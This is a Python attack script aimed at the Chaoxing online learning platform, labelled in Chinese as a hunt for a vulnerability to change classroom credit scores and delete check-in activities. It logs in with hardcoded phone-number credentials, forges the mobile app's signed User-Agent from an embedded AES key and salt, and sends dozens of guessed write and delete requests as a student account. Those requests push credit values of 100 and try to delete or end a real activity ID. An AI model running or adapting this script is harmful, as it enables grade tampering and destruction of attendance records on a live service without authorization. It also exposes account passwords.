import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in str(detail).lower() for kw in ["success", "删除成功", "修改成功"]) or '"state":"success"' in str(evidence)
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"课堂积分修改 & 删除签到活动漏洞探索")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    # ========== TASK 1: 课堂积分API探索 ==========
    print("\n" + "=" * 80)
    print("[TASK 1] 课堂积分相关API探索")
    print("=" * 80)

    # 1.1 积分查询API
    print("\n--- 1.1 积分查询API ---")
    credit_query_apis = [
        # mobilelearn域名
        f"{base}/ppt/activeAPI/getCredit",
        f"{base}/ppt/activeAPI/creditList",
        f"{base}/ppt/activeAPI/scoreList",
        f"{base}/ppt/activeAPI/getScore",
        f"{base}/ppt/activeAPI/getPoint",
        f"{base}/ppt/activeAPI/pointList",
        f"{base}/ppt/activeAPI/stuCredit",
        f"{base}/ppt/activeAPI/classCredit",
        f"{base}/ppt/activeAPI/classScore",
        f"{base}/ppt/activeAPI/classPoint",
        # mooc1-api域名
        "https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/getCredit",
        "https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/creditList",
        "https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/scoreList",
        "https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/classCredit",
        # 积分/经验值相关
        f"{base}/credit/getCredit",
        f"{base}/credit/list",
        f"{base}/score/getScore",
        f"{base}/point/getPoint",
        f"{base}/experience/getExperience",
        f"{base}/pptSign/getCredit",
        f"{base}/pptSign/creditList",
        # 课堂表现分/互动分
        f"{base}/ppt/activeAPI/getClassScore",
        f"{base}/ppt/activeAPI/classScoreList",
        f"{base}/ppt/activeAPI/interactionScore",
        f"{base}/ppt/activeAPI/stuScoreList",
        f"{base}/ppt/activeAPI/getStuScore",
        # newsign路径
        f"{base}/newsign/getCredit",
        f"{base}/newsign/creditList",
        f"{base}/newsign/getScore",
    ]

    for url in credit_query_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                r = session.get(url,
                               params={"courseId": COURSE_ID, "classId": CLASS_ID,
                                       "uid": puid_s if label == "学生" else puid_t},
                               timeout=15)
                short_name = url.replace("https://", "").replace("mobilelearn.chaoxing.com", "ml").replace("mooc1-api.chaoxing.com", "mc")[:50]
                if r.status_code != 404 and len(r.text) > 5:
                    rec(f"T1-query-{short_name[:30]}-{label}",
                        f"{label} GET: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # 1.2 积分修改API
    print("\n--- 1.2 积分修改API ---")
    credit_modify_apis = [
        (f"{base}/ppt/activeAPI/updateCredit", "updateCredit"),
        (f"{base}/ppt/activeAPI/addCredit", "addCredit"),
        (f"{base}/ppt/activeAPI/modifyCredit", "modifyCredit"),
        (f"{base}/ppt/activeAPI/setCredit", "setCredit"),
        (f"{base}/ppt/activeAPI/saveCredit", "saveCredit"),
        (f"{base}/ppt/activeAPI/updateScore", "updateScore"),
        (f"{base}/ppt/activeAPI/addScore", "addScore"),
        (f"{base}/ppt/activeAPI/modifyScore", "modifyScore"),
        (f"{base}/ppt/activeAPI/setScore", "setScore"),
        (f"{base}/ppt/activeAPI/updatePoint", "updatePoint"),
        (f"{base}/ppt/activeAPI/addPoint", "addPoint"),
        (f"{base}/ppt/activeAPI/modifyPoint", "modifyPoint"),
        (f"{base}/credit/updateCredit", "credit-updateCredit"),
        (f"{base}/credit/addCredit", "credit-addCredit"),
        (f"{base}/credit/modifyCredit", "credit-modifyCredit"),
        (f"{base}/score/updateScore", "score-updateScore"),
        (f"{base}/score/addScore", "score-addScore"),
        (f"{base}/point/updatePoint", "point-updatePoint"),
        (f"{base}/pptSign/updateCredit", "pptSign-updateCredit"),
        (f"{base}/pptSign/addCredit", "pptSign-addCredit"),
        (f"{base}/pptSign/updateScore", "pptSign-updateScore"),
        (f"{base}/newsign/updateCredit", "newsign-updateCredit"),
        (f"{base}/newsign/addCredit", "newsign-addCredit"),
        (f"{base}/newsign/updateScore", "newsign-updateScore"),
        (f"{base}/newsign/modifyCredit", "newsign-modifyCredit"),
        # mooc1-api域名
        ("https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/updateCredit", "mc-updateCredit"),
        ("https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/addCredit", "mc-addCredit"),
        ("https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/updateScore", "mc-updateScore"),
    ]

    for url, name in credit_modify_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                r = session.post(url,
                                data={"courseId": COURSE_ID, "classId": CLASS_ID,
                                      "uid": puid_s if label == "学生" else puid_t,
                                      "credit": "100", "score": "100", "point": "100",
                                      "type": "1", "value": "100"},
                                headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                         "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=15)
                if r.status_code != 404 and len(r.text) > 5:
                    rec(f"T1-modify-{name[:25]}-{label}",
                        f"{label} POST {name}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # 1.3 获取课程积分页面
    print("\n--- 1.3 课程积分页面分析 ---")
    credit_pages = [
        f"https://mooc1.chaoxing.com/mycourse/stuindex?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://mooc1.chaoxing.com/edustudy/coursecredit?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"{base}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_s}",
    ]

    for url in credit_pages:
        try:
            r = s_s.get(url, timeout=20, allow_redirects=True)
            if r.status_code == 200 and len(r.text) > 100:
                # 搜索积分/经验值相关关键词
                credit_refs = re.findall(r'(?:credit|积分|score|point|经验值|经验|互动分|表现分)[^"\';\s]{0,80}', r.text, re.I)
                api_refs = re.findall(r'(?:fetch|ajax|post|get)\s*\(?[\'"]([^\'"]+(?:credit|score|point|积分)[^\'"]*)', r.text, re.I)
                js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text)
                print(f"  {url[:60]}: HTTP {r.status_code}, credit_refs={len(credit_refs)}, api_refs={api_refs[:3]}")
                if credit_refs:
                    rec(f"T1-page-credit", f"积分引用: {credit_refs[:5]}", str(credit_refs[:10])[:300])
                if api_refs:
                    rec(f"T1-page-api", f"积分API: {api_refs[:5]}", str(api_refs[:10])[:300])
        except Exception as e:
            pass

    # 1.4 教师端积分管理页面
    print("\n--- 1.4 教师端积分管理页面 ---")
    teacher_credit_pages = [
        f"https://mooc1.chaoxing.com/teacher/statistic?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/teacherindex?courseid={COURSE_ID}&clazzid={CLASS_ID}",
        f"{base}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_t}",
    ]

    for url in teacher_credit_pages:
        try:
            r = s_t.get(url, timeout=20, allow_redirects=True)
            if r.status_code == 200 and len(r.text) > 100:
                credit_refs = re.findall(r'(?:credit|积分|score|point|经验值|经验|互动分|表现分|课堂积分)[^"\';\s]{0,80}', r.text, re.I)
                api_refs = re.findall(r'(?:fetch|ajax|post|get)\s*\(?[\'"]([^\'"]+(?:credit|score|point|积分)[^\'"]*)', r.text, re.I)
                print(f"  教师 {url[:60]}: credit_refs={len(credit_refs)}, api_refs={api_refs[:3]}")
                if credit_refs:
                    rec(f"T1-teacher-credit", f"教师积分引用: {credit_refs[:5]}", str(credit_refs[:10])[:300])
        except Exception as e:
            pass

    # 1.5 直接搜索积分相关API（使用mooc1-api的已知路径模式）
    print("\n--- 1.5 mooc-ans路径积分API ---")
    mooc_credit_apis = [
        "https://mooc1-api.chaoxing.com/mooc-ans/credit/getCredit",
        "https://mooc1-api.chaoxing.com/mooc-ans/credit/updateCredit",
        "https://mooc1-api.chaoxing.com/mooc-ans/credit/addCredit",
        "https://mooc1-api.chaoxing.com/mooc-ans/score/getScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/score/updateScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/score/addScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/point/getPoint",
        "https://mooc1-api.chaoxing.com/mooc-ans/point/updatePoint",
        "https://mooc1-api.chaoxing.com/mooc-ans/classscore/getClassScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/classscore/updateClassScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/classscore/addClassScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/classscore/modifyClassScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/interaction/getInteractionScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/interaction/updateInteractionScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/stuscore/getStuScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/stuscore/updateStuScore",
        "https://mooc1-api.chaoxing.com/mooc-ans/stuscore/addStuScore",
    ]

    for url in mooc_credit_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                r = session.get(url,
                               params={"courseId": COURSE_ID, "classId": CLASS_ID,
                                       "uid": puid_s if label == "学生" else puid_t},
                               timeout=15)
                if r.status_code != 404 and len(r.text) > 5:
                    short = url.replace("https://mooc1-api.chaoxing.com/mooc-ans/", "")[:30]
                    rec(f"T1-mooc-{short}-{label}",
                        f"{label} GET {short}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # ========== TASK 2: 删除签到活动API探索 ==========
    print("\n" + "=" * 80)
    print("[TASK 2] 删除签到活动相关API探索")
    print("=" * 80)

    # 获取一个签到活动ID用于测试
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []
    test_aid = str(active_list[0].get("id", "5000163776554")) if active_list else "5000163776554"
    print(f"  测试活动ID: {test_aid}")

    # 2.1 删除活动API
    print("\n--- 2.1 删除活动API ---")
    delete_apis = [
        (f"{base}/ppt/activeAPI/deleteActive", "deleteActive"),
        (f"{base}/ppt/activeAPI/delActive", "delActive"),
        (f"{base}/ppt/activeAPI/removeActive", "removeActive"),
        (f"{base}/ppt/activeAPI/deleteSign", "deleteSign"),
        (f"{base}/ppt/activeAPI/delSign", "delSign"),
        (f"{base}/ppt/activeAPI/removeSign", "removeSign"),
        (f"{base}/pptSign/deleteSign", "pptSign-deleteSign"),
        (f"{base}/pptSign/deleteActive", "pptSign-deleteActive"),
        (f"{base}/pptSign/delSign", "pptSign-delSign"),
        (f"{base}/pptSign/delActive", "pptSign-delActive"),
        (f"{base}/pptSign/removeSign", "pptSign-removeSign"),
        (f"{base}/pptSign/cancelSign", "pptSign-cancelSign"),
        (f"{base}/newsign/deleteSign", "newsign-deleteSign"),
        (f"{base}/newsign/deleteActive", "newsign-deleteActive"),
        (f"{base}/newsign/delSign", "newsign-delSign"),
        (f"{base}/newsign/delActive", "newsign-delActive"),
        (f"{base}/newsign/cancelSign", "newsign-cancelSign"),
        (f"{base}/newsign/removeSign", "newsign-removeSign"),
        # mooc1-api
        ("https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/deleteActive", "mc-deleteActive"),
        ("https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/deleteSign", "mc-deleteSign"),
        ("https://mooc1-api.chaoxing.com/mooc-ans/pptSign/deleteSign", "mc-pptSign-deleteSign"),
        ("https://mooc1-api.chaoxing.com/mooc-ans/pptSign/deleteActive", "mc-pptSign-deleteActive"),
    ]

    for url, name in delete_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                r = session.post(url,
                                data={"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID,
                                      "uid": puid_s if label == "学生" else puid_t,
                                      "id": test_aid, "type": "2"},
                                headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                         "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=15, allow_redirects=False)
                if r.status_code != 404:
                    rec(f"T2-delete-{name[:25]}-{label}",
                        f"{label} POST {name}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # 2.2 结束活动API
    print("\n--- 2.2 结束活动API ---")
    end_apis = [
        (f"{base}/ppt/activeAPI/endActive", "endActive"),
        (f"{base}/ppt/activeAPI/stopActive", "stopActive"),
        (f"{base}/ppt/activeAPI/finishActive", "finishActive"),
        (f"{base}/ppt/activeAPI/closeActive", "closeActive"),
        (f"{base}/ppt/activeAPI/endSign", "endSign"),
        (f"{base}/ppt/activeAPI/stopSign", "stopSign"),
        (f"{base}/pptSign/endSign", "pptSign-endSign"),
        (f"{base}/pptSign/stopSign", "pptSign-stopSign"),
        (f"{base}/pptSign/endActive", "pptSign-endActive"),
        (f"{base}/newsign/endSign", "newsign-endSign"),
        (f"{base}/newsign/stopSign", "newsign-stopSign"),
        (f"{base}/newsign/endActive", "newsign-endActive"),
    ]

    for url, name in end_apis:
        for session, label in [(s_s, "学生"), (s_t, "教师")]:
            try:
                r = session.post(url,
                                data={"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID,
                                      "uid": puid_s if label == "学生" else puid_t},
                                headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                         "Content-Type": "application/x-www-form-urlencoded"},
                                timeout=15, allow_redirects=False)
                if r.status_code != 404:
                    rec(f"T2-end-{name[:25]}-{label}",
                        f"{label} POST {name}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # 2.3 GET方法测试
    print("\n--- 2.3 GET方法删除测试 ---")
    get_delete_apis = [
        f"{base}/ppt/activeAPI/deleteActive",
        f"{base}/pptSign/deleteSign",
        f"{base}/newsign/deleteSign",
        f"{base}/newsign/deleteActive",
    ]

    for url in get_delete_apis:
        for session, label in [(s_s, "学生")]:
            try:
                r = session.get(url,
                               params={"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID,
                                       "uid": puid_s, "id": test_aid, "type": "2"},
                               headers={"Referer": f"{base}/"},
                               timeout=15, allow_redirects=False)
                short = url.split("/")[-1][:25]
                if r.status_code != 404:
                    rec(f"T2-get-delete-{short}-{label}",
                        f"{label} GET {short}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
            except Exception as e:
                pass

    # ========== 保存结果 ==========
    print("\n" + "=" * 80)
    print("[保存结果]")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "credit_delete_explore_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    # 汇总非404结果
    non_404 = [r for r in results if "404" not in str(r.get("detail", "")) and "HTTP 404" not in str(r.get("detail", ""))]
    print(f"\n  非404结果: {len(non_404)} 项")
    for r_item in non_404:
        print(f"    {r_item['tag']}: {r_item['detail'][:120]}")

if __name__ == "__main__":
    run()
